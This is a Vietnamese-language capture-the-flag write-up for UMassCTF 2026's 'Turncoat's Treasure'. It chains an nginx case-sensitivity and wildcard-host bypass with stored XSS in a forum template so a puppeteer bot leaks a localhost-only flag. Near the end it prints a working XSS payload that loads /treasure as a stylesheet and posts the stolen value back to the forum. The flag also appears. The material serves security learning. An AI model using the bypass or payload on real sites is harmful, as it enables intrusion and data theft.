---
title: "Turncoat’s Treasure"
slug: "umassctf-2026-turncoats-treasure"
platform: "UMassCTF 2026"
difficulty: "Medium"
vulnerabilities: ["Cross-Site Scripting","Proxy Misconfiguration","CSS Data Exfiltration"]
publishedAt: "2026-09-14"
summary: "Theo dõi quá trình phân tích proxy, forum và bot captain trong Turncoat’s Treasure."
draft: false
sortOrder: 10
---
## Overview
Đây là challenge gồm 4 phần chính:
1. **forum**: nơi user đăng ký, đăng nhập và tạo post. Đây là nơi attacker có thể ksoat nội dung đầu vào
2. **product**: service phụ nhưng có endpoint **/check-captain** làm lộ ip nội bộ của **captain**
3. **captain**: bot dùng puppeteer để mở url do user chỉ định và chứa route **/treasure** trả flag và chỉ cho localhost vào
4. **proxy**: nginx đứng trước hệ thống và route reqeust theo subdomain nhưng cấu hình sai

Mục tiêu là lợi dụng cái cấu hình sai ở **proxy** -> gọi sang captain, sau đó dùng stored XSS trong **forum** để thực thi js trong browser của bot và truy cập **/treasure** từ localhost và lấy flag ra. 
## Vulnerability and Exploit
### Proxy bypass để gọi captain
xem các source code sau 
1. **docker-compose.yml**
![image](https://hackmd.io/_uploads/ryZjbH0n-e.png)
**proxy** là service duy nhất được expose ra ngoài host
![image](https://hackmd.io/_uploads/BJQ67BRhbe.png)
**captain** là service nội bộ, không có port chỉ nằm trong piratenet
2. **captain/src/index.ts**
![image](https://hackmd.io/_uploads/BJmM5S0nbx.png)
3. **proxy/nginx.conf**
![image](https://hackmd.io/_uploads/BkbwzUR3-x.png)
4 **product/app.js**
![image](https://hackmd.io/_uploads/BkcWVI0n-e.png)
product thực thi ping captian từ container và trả nguyên kết quả=> có địa chỉ ip đã resolve
Từ đoạn phân tích code trên ta tiến hành thử để xem thành công như nào
Đầu tiên ra request đến **check-captain** để lấy ip của captain
![image](https://hackmd.io/_uploads/Bk7nEwC3Wg.png)
ta có được ip như trên tiếp theo ta thực hiện bước bypass proxy
![image](https://hackmd.io/_uploads/HkggHwCn-e.png)
tại sao payload này bypass được
1. vì đoạn trên ta có thể thấy nginx check **/call-captain** mà nginx phân biệt hoa thường nên viết hoa là qua được
2. bypass host thì dùng **make-10.67.0.3-rr.1u.ms.pirate.bay** khiến match wildcarrd và subdomain k bị chặn  giải thích cho cái này thì đây là một hostname đặc biệt mà dns sẽ resolve thành ip mình đưa vào
3. còn targer tới 127.0.0.1 thì đang làm local nếu k target đến đây thì phải resolve dns bị fail
Và đây là log của Captain
![image](https://hackmd.io/_uploads/Hyx7IPRh-e.png)
đây là bằng chứng cho nginx đã proxy request tới captain và mình đã control được url bot mà mình sẽ mở => captain đã thực sự get tới url này muahahaha

### Lấy JS execution trong browser của bot
Giờ mình bắt bot mở được trang gì đó rồi thì với vài bước recon hiện ngay lên tư duy liệu có thể bắt bot mở/render cái gì mà mình host k
Thật ra thì cái test ban đầu ở bước trên cũng là nói trước rồi ta xem lại source template ở **/forum**
- **index**
![image](https://hackmd.io/_uploads/r1xW1l_0n-x.png)
- **user**
![image](https://hackmd.io/_uploads/H1kfxOR2-e.png)
ở index.html thì dùng **{{ p.content }}** k có safe nên tự escape còn cái user.html lại có **{{ p.content | safe }}** nên nó k tự escape và browser có thể thực thi js =>>>> XSSSSSSSSSSSS
Ta test thử trước
![image](https://hackmd.io/_uploads/SyxYGdAhWe.png)
![image](https://hackmd.io/_uploads/rkA5GuC2Wl.png)
xác nhận đã có xss
ta test lại một lần nữa xss bằng con bot
![image](https://hackmd.io/_uploads/HkRuQuC3Zg.png)
![image](https://hackmd.io/_uploads/Byxg67OAhZx.png)
ăn rồiii
### từ /treasure => lấy flag
![image](https://hackmd.io/_uploads/HkO2vuC2bx.png)

nhìn lại code tôi đã noi ở trên và kết hợp những thứ mình làm được ở trên:
1. mình nhờ browers bot đọc hộ được
2. mà cái browser bot đang origin forum nên k đọc thẳng body được vì CORS
3. mà text/css là loại tài nguyên browser cho cross-origin bằng **<link rel="stylesheet">**
ở phase này payload xss hơi dai nen dung lgpt viet not...
```html=
<script>
(() => {
  const username = "test1";
  const password = "a";
  const holder = document.createElement('div');
  holder.innerHTML = '<here><is><your><treasure id="t"></treasure></your></is></here>';
  document.body.appendChild(holder);

  async function submit(path, data) {
    await fetch(path, {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams(data)
    });
  }
  async function exfil() {
    const target = document.getElementById('t');
    const value = getComputedStyle(target).getPropertyValue('--x').trim();
    if (!value) return;
    await submit('/login', {username, password});
    await submit('/post', {content: value});
  }
  const link = document.createElement('link');
  link.rel = 'stylesheet';
  link.href = 'https://127.0.0.1/treasure?name=%7B--x%3A';
  link.onload = exfil;
  document.head.appendChild(link);
})();
</script>
```
và đã lấy được flag
![image](https://hackmd.io/_uploads/Hyd3jOA3-e.png)
![image](https://hackmd.io/_uploads/S1g0suRhbg.png)
flag ở instance : **UMASS{s0m3body_t0uch3d_th3_tre45ur3_0mg_th4ts_cr4zy}**